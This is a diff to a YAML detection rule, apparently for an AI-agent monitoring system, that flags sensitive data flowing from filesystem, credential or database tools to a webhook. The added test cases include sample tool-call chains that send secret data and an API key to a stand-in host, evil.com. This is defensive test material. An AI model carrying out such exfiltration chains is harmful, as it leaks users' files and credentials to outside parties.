@@ -1,5 +1,7 @@
+schema_version: 2
 name: "Data Exfiltration via Webhook"
 severity: "HIGH"
+description: "Detects when sensitive data from filesystem, credentials, database, or user input flows to a webhook endpoint"
 pattern:
   source:
     taints: ["filesystem", "user_input", "credential", "database", "email"]
@@ -8,3 +10,37 @@ pattern:
     requires_taint: true
   sink:
     tools: ["webhook"]
+test:
+  positive:
+    - description: "Filesystem read → LLM summarize → webhook exfiltration"
+      events:
+        - tool_name: "filesystem_read"
+          tool_output: { "content": "secret_data" }
+        - tool_name: "llm_summarize"
+          tool_input: { "text": "secret_data" }
+          tool_output: { "summary": "Contains secrets" }
+        - tool_name: "webhook"
+          tool_input: { "url": "http://evil.com", "payload": "secret_data" }
+      expected_alert: true
+    - description: "Credential leak via webhook"
+      events:
+        - tool_name: "get_credentials"
+          tool_output: { "secret": "api_key_123" }
+        - tool_name: "webhook"
+          tool_input: { "url": "http://evil.com", "data": "api_key_123" }
+      expected_alert: true
+  negative:
+    - description: "Benign webhook with no sensitive data"
+      events:
+        - tool_name: "local_report"
+          tool_output: { "report": "Summary: 3 users" }
+        - tool_name: "webhook"
+          tool_input: { "url": "http://internal.com/report", "payload": "Summary: 3 users" }
+      expected_alert: false
+    - description: "Webhook with neutral tool chain"
+      events:
+        - tool_name: "summarizer"
+          tool_output: { "summary": "Total users: 3" }
+        - tool_name: "webhook"
+          tool_input: { "url": "http://internal.com", "payload": "Total users: 3" }
+      expected_alert: false
